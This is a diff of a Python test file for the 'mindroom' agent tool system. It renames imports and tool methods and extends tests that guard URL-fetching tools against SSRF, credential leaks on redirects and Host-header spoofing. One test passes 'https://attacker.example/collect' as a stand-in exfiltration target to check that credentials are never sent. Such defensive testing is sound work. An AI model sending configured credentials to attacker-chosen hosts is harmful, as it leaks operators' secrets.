@@ -17,6 +17,7 @@ from collections.abc import AsyncIterator, Callable, Iterator
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from types import SimpleNamespace
+from typing import get_args, get_type_hints
 from unittest.mock import AsyncMock
 from urllib.parse import urlsplit
 
@@ -35,6 +36,7 @@ import mindroom.tool_system.plugins as plugins_module
 import mindroom.tools  # noqa: F401
 import mindroom.tools.custom_api as custom_api_module
 from mindroom import public_fetch
+from mindroom.config.authored_overrides import AUTHORED_OVERRIDE_INHERIT
 from mindroom.config.main import Config, ConfigRuntimeValidationError, load_config
 from mindroom.constants import resolve_runtime_paths
 from mindroom.public_fetch import PublicFetchError
@@ -42,27 +44,26 @@ from mindroom.redaction import REDACTED
 from mindroom.server_fetch_url import ServerFetchUrlError
 from mindroom.tool_system.authoring import Toolkit
 from mindroom.tool_system.declarations import (
+    ConfigField,
     SetupType,
+    ToolAuthoredOverrideValidator,
     ToolCategory,
     ToolExecutionTarget,
     ToolFileAccess,
+    ToolManagedInitArg,
     ToolValidationInfo,
 )
-from mindroom.tool_system.metadata import (
-    _AUTHORED_OVERRIDE_INHERIT,
-    ConfigField,
-    ToolAuthoredOverrideValidator,
-    ToolConfigOverrideError,
-    ToolManagedInitArg,
-    deserialize_tool_validation_snapshot,
-    export_tools_metadata,
-    get_tool_by_name,
-    serialize_tool_validation_snapshot,
-    validate_authored_tool_entry_overrides,
-)
+from mindroom.tool_system.metadata import get_tool_by_name
 from mindroom.tool_system.plugins import config_plugins, prepare_plugins, publish_plugins
 from mindroom.tool_system.registration import register_tool_with_metadata
 from mindroom.tool_system.registry import builtin_tool_registry
+from mindroom.tool_system.settings import (
+    ToolConfigOverrideError,
+    deserialize_tool_validation_snapshot,
+    export_tools_metadata,
+    serialize_tool_validation_snapshot,
+    validate_authored_tool_entry_overrides,
+)
 from mindroom.tool_system.toolkits import toolkit_function_names
 from mindroom.tool_system.worker_routing import (
     ResolvedWorkerTarget,
@@ -102,7 +103,7 @@ def test_export_tools_metadata_json() -> None:
         "tools_metadata.json is out of date, regenerate it with "
         './.venv/bin/python -c "import json; import mindroom.tools; '
         "from pathlib import Path; "
-        "from mindroom.tool_system.metadata import export_tools_metadata; "
+        "from mindroom.tool_system.settings import export_tools_metadata; "
         "from mindroom.tool_system.registry import builtin_tool_registry; "
         "Path('src/mindroom/tools_metadata.json').write_text("
         "json.dumps({'tools': export_tools_metadata(builtin_tool_registry().entries)}, indent=2, sort_keys=True) + '\\n', "
@@ -292,7 +293,7 @@ def test_custom_api_tool_rejects_unsafe_url_before_request(
     tool = custom_api_tools()(base_url=base_url)
 
     with pytest.raises(ServerFetchUrlError) as exc_info:
-        tool.make_request(endpoint)
+        tool.custom_api_request(endpoint)
 
     assert exc_info.value.reason == reason
 
@@ -352,7 +353,7 @@ def test_custom_api_tool_refuses_configured_credentials_without_base_url(
     sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={}))
     tool = custom_api_tools()(**credentials)
 
-    payload = json.loads(tool.make_request("https://attacker.example/collect"))
+    payload = json.loads(tool.custom_api_request("https://attacker.example/collect"))
 
     assert "base_url" in payload["error"]
     assert sent == []
@@ -389,7 +390,7 @@ def test_custom_api_tool_strips_configured_credentials_from_hops_off_the_base_ur
         headers={"X-Api-Key": "operator-secret", "Accept": "application/json"},
     )
 
-    payload = json.loads(tool.make_request("start", headers={"X-Request-Id": "req-1"}))
+    payload = json.loads(tool.custom_api_request("start", headers={"X-Request-Id": "req-1"}))
 
     assert payload["data"] == {"ok": True}
     first, followed = sent
@@ -409,7 +410,7 @@ def test_custom_api_tool_sends_dashboard_json_headers_to_the_base_url(monkeypatc
     sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={"ok": True}))
     tool = custom_api_tools()(base_url="https://api.example.com", headers='{"X-Api-Key": "operator-secret"}')
 
-    assert json.loads(tool.make_request("data"))["data"] == {"ok": True}
+    assert json.loads(tool.custom_api_request("data"))["data"] == {"ok": True}
     assert sent[0].headers["X-Api-Key"] == "operator-secret"
 
 
@@ -428,7 +429,7 @@ def test_custom_api_tool_hands_its_tls_verification_setting_to_the_transport(
 
     monkeypatch.setattr(custom_api_module, "ServerFetchAsyncHTTPTransport", transport)
 
-    payload = json.loads(custom_api_tools()(verify_ssl=verify_ssl).make_request("https://93.184.216.34/data"))
+    payload = json.loads(custom_api_tools()(verify_ssl=verify_ssl).custom_api_request("https://93.184.216.34/data"))
 
     assert payload["data"] == {"ok": True}
     assert transport_options == [{"verify": verify_ssl}]
@@ -452,7 +453,7 @@ def test_custom_api_tool_strips_basic_auth_from_hops_off_the_base_url_origin(mon
     sent = _install_custom_api_transport(monkeypatch, respond)
     tool = custom_api_tools()(base_url="https://api.example.com", username="operator", password="operator-password")  # noqa: S106
 
-    assert json.loads(tool.make_request("download"))["data"] == {"ok": True}
+    assert json.loads(tool.custom_api_request("download"))["data"] == {"ok": True}
     assert sent[0].headers["Authorization"].startswith("Basic ")
     assert [request.url.host for request in sent] == ["api.example.com", "cdn.example"]
     assert "Authorization" not in sent[1].headers
@@ -468,7 +469,7 @@ def test_custom_api_tool_without_credentials_follows_redirects_anywhere_public(m
 
     sent = _install_custom_api_transport(monkeypatch, respond)
 
-    payload = json.loads(custom_api_tools()().make_request("https://start.example/data"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://start.example/data"))
 
     assert payload["data"] == {"ok": True}
     assert [request.url.host for request in sent] == ["start.example", "cdn.example"]
@@ -501,7 +502,7 @@ def test_custom_api_tool_filters_sensitive_response_headers(monkeypatch: pytest.
         lambda _request: httpx.Response(200, headers=response_headers, content=b'{"ok": "true"}'),
     )
 
-    payload = json.loads(custom_api_tools()().make_request("https://example.com/data"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://example.com/data"))
 
     assert payload["data"] == {"ok": "true"}
     assert {name: value for name, value in payload["headers"].items() if name != "content-length"} == {
@@ -531,7 +532,7 @@ def test_custom_api_tool_drops_a_model_host_header_from_credentialed_requests(mo
     sent = _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, json={}))
     tool = custom_api_tools()(base_url="https://api.example.com", api_key="sk-operator")
 
-    tool.make_request("data", headers={"Host": "internal.example", "hOST": "admin.example"})
+    tool.custom_api_request("data", headers={"Host": "internal.example", "hOST": "admin.example"})
 
     assert sent[0].headers.get_list("Host") == ["api.example.com"]
     assert sent[0].headers["Authorization"] == "Bearer sk-operator"
@@ -548,7 +549,7 @@ def test_custom_api_tool_never_inflates_a_compressed_final_response(monkeypatch:
     )
 
     payload = json.loads(
-        custom_api_tools()().make_request("https://example.com/data", headers={"accept-encoding": "br"}),
+        custom_api_tools()().custom_api_request("https://example.com/data", headers={"accept-encoding": "br"}),
     )
 
     assert sent[0].headers.get_list("Accept-Encoding") == ["identity"]
@@ -585,7 +586,7 @@ def test_custom_api_tool_refuses_only_codings_httpx_would_decode(
         ),
     )
 
-    payload = json.loads(custom_api_tools()().make_request("https://example.com/data"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://example.com/data"))
 
     if refused is None:
         assert payload["data"] == {"ok": True}
@@ -610,7 +611,7 @@ def test_custom_api_tool_follows_redirects_without_reading_their_bodies(monkeypa
 
     sent = _install_custom_api_transport(monkeypatch, respond)
 
-    payload = json.loads(custom_api_tools()().make_request("https://example.com/start"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://example.com/start"))
 
     assert payload["data"] == {"ok": True}
     assert [request.url.path for request in sent] == ["/start", "/final"]
@@ -622,7 +623,7 @@ def test_custom_api_tool_caps_the_final_body(monkeypatch: pytest.MonkeyPatch) ->
     monkeypatch.setattr(custom_api_module, "_MAX_RESPONSE_BYTES", 1024)
     _install_custom_api_transport(monkeypatch, lambda _request: httpx.Response(200, content=b"x" * 4096))
 
-    payload = json.loads(custom_api_tools()().make_request("https://example.com/large"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://example.com/large"))
 
     assert payload["error"] == "Response body exceeds 1024 bytes"
     assert "data" not in payload
@@ -635,7 +636,7 @@ def test_custom_api_tool_caps_redirect_hops(monkeypatch: pytest.MonkeyPatch) -> 
         lambda _request: httpx.Response(302, headers={"Location": "https://example.com/loop"}),
     )
 
-    payload = json.loads(custom_api_tools()().make_request("https://example.com/loop"))
+    payload = json.loads(custom_api_tools()().custom_api_request("https://example.com/loop"))
 
     assert payload["error"] == "Request failed: more than 10 redirects"
     assert len(sent) == 11
@@ -645,17 +646,17 @@ def test_custom_api_tool_caps_redirect_hops(monkeypatch: pytest.MonkeyPatch) -> 
     ("tool_function", "error"),
     [
         pytest.param(
-            lambda: trafilatura_tools()().extract_text,
+            lambda: lambda url: trafilatura_tools()().trafilatura_extract("text", url=url),
             "Error: Could not fetch content from URL: http://93.184.216.34/slow",
             id="trafilatura",
         ),
         pytest.param(
-            lambda: newspaper4k_tools()().read_article,
+            lambda: newspaper4k_tools()().newspaper_read_article,
             "Error reading article from http://93.184.216.34/slow: No data found.",
             id="newspaper",
         ),
         pytest.param(
-            lambda: custom_api_tools()(timeout=0.3).make_request,
+            lambda: custom_api_tools()(timeout=0.3).custom_api_request,
             json.dumps({"error": "Request failed: the request did not finish within 0.3 seconds"}, indent=2),
             id="custom_api",
         ),
@@ -691,7 +692,7 @@ def test_custom_api_tool_returns_at_its_timeout_while_a_hostname_lookup_hangs(mo
     tool = custom_api_tools()(base_url="https://api.example.com", timeout=0.3)
     started = time.monotonic()
     try:
-        payload = json.loads(tool.make_request("data"))
+        payload = json.loads(tool.custom_api_request("data"))
         elapsed = time.monotonic() - started
     finally:
         released.set()
@@ -725,7 +726,7 @@ def test_custom_api_tool_tries_the_next_address_when_one_never_answers(monkeypat
     monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", connect_tcp)
 
     payload = json.loads(
-        custom_api_tools()(timeout=SETTLE_TIMEOUT_SECONDS).make_request("https://api.example.com/data"),
+        custom_api_tools()(timeout=SETTLE_TIMEOUT_SECONDS).custom_api_request("https://api.example.com/data"),
     )
 
     assert dialed == [(dead, 0.1), (live, 0.1)]
@@ -743,7 +744,7 @@ def test_custom_api_tool_returns_a_response_that_arrived_before_closing_the_conn
 
     monkeypatch.setattr(httpx.MockTransport, "aclose", close_slowly)
 
-    payload = json.loads(custom_api_tools()(timeout=0.2).make_request("https://example.com/data"))
+    payload = json.loads(custom_api_tools()(timeout=0.2).custom_api_request("https://example.com/data"))
 
     assert payload["data"] == {"ok": True}
 
@@ -759,7 +760,7 @@ def test_crawl4ai_tool_rejects_private_url_before_crawl(monkeypatch: pytest.Monk
     monkeypatch.setattr(tool, "_async_crawl", forbidden_crawl)
 
     with pytest.raises(ServerFetchUrlError) as exc_info:
-        tool.crawl("http://127.0.0.1:8000/private")
+        tool.crawl4ai_crawl("http://127.0.0.1:8000/private")
 
     assert exc_info.value.reason == "private_address"
 
@@ -1015,7 +1016,9 @@ async def test_crawl4ai_browser_egress_route(
 
 
 # Research toolkits whose URL functions download pages from the MindRoom process through the server-fetch guard.
-_LOCAL_URL_FETCH_TOOLS = ("agentql", "crawl4ai", "newspaper", "trafilatura", "website")
+_LOCAL_URL_FETCH_TOOLS = ("agentql", "browser", "crawl4ai", "newspaper", "trafilatura", "website")
+# Local URL fetch tools with non-URL actions whose URL-taking actions are async.
+_URL_FETCH_ACTIONS = {"browser": ("open", "navigate")}
 # Research toolkits that forward URLs to a hosted service instead of downloading them locally.
 _HOSTED_URL_FETCH_TOOLS = (
     "brightdata",
@@ -1110,9 +1113,22 @@ def test_local_url_fetch_tools_do_not_contact_loopback_targets(
 
     with _recording_loopback_server() as (url, connections):
         for function_name, parameter in _url_functions(tool_name):
+            method = getattr(toolkit, function_name)
             argument = [url] if parameter.endswith("urls") else url
-            with contextlib.suppress(ServerFetchUrlError, PublicFetchError):
-                getattr(toolkit, function_name)(**{parameter: argument})
+            action_hint = get_type_hints(method).get("action")
+            action_values = _URL_FETCH_ACTIONS.get(tool_name) or (
+                get_args(action_hint) if action_hint is not None else ()
+            )
+            call_kwargs_list = (
+                [{"action": action, parameter: argument} for action in action_values]
+                if action_values
+                else [{parameter: argument}]
+            )
+            for call_kwargs in call_kwargs_list:
+                with contextlib.suppress(ServerFetchUrlError, PublicFetchError):
+                    result = method(**call_kwargs)
+                    if inspect.isawaitable(result):
+                        asyncio.run(result)
 
     assert connections == []
 
@@ -1400,10 +1416,10 @@ def test_validate_authored_overrides_accepts_inherit_sentinel_for_required_field
 
     assert validate_authored_tool_entry_overrides(
         tool_name,
-        {"workspace_id": _AUTHORED_OVERRIDE_INHERIT},
+        {"workspace_id": AUTHORED_OVERRIDE_INHERIT},
         config_path_prefix="agents.code.tools[0]",
         tool_metadata=builtin_tool_registry().entries,
-    ) == {"workspace_id": _AUTHORED_OVERRIDE_INHERIT}
+    ) == {"workspace_id": AUTHORED_OVERRIDE_INHERIT}
 
 
 def test_validate_authored_overrides_accepts_string_lists_for_text_fields_with_agent_override_arrays() -> None:
